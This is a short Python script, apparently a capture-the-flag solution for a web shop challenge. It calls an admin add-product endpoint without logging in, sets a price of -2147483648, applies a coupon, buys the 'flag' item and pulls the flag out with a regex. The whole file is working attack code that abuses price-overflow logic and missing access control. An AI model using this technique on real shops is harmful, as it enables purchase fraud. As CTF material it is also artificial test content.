import requests
import re

s = requests.Session()

r = s.get('https://web-dry-ice-n-co-sb0z2ze9.smiley.cat/')

r = s.post('https://web-dry-ice-n-co-sb0z2ze9.smiley.cat/admin/add-product?name=solve&price=-2147483648&description=hehe')

r = s.post('https://web-dry-ice-n-co-sb0z2ze9.smiley.cat/add?productName=solve&quantity=1')
r = s.post('https://web-dry-ice-n-co-sb0z2ze9.smiley.cat/apply-coupon?couponCode=SMILEICE')
r = s.post('https://web-dry-ice-n-co-sb0z2ze9.smiley.cat/purchase')

r = s.post('https://web-dry-ice-n-co-sb0z2ze9.smiley.cat/add?productName=flag&quantity=1')
r = s.post('https://web-dry-ice-n-co-sb0z2ze9.smiley.cat/purchase')

match = re.search(r"\.\;\,\;\.\{.*?\}", r.text)
if match:
    print("Found:", match.group())
else:
    print("No match found")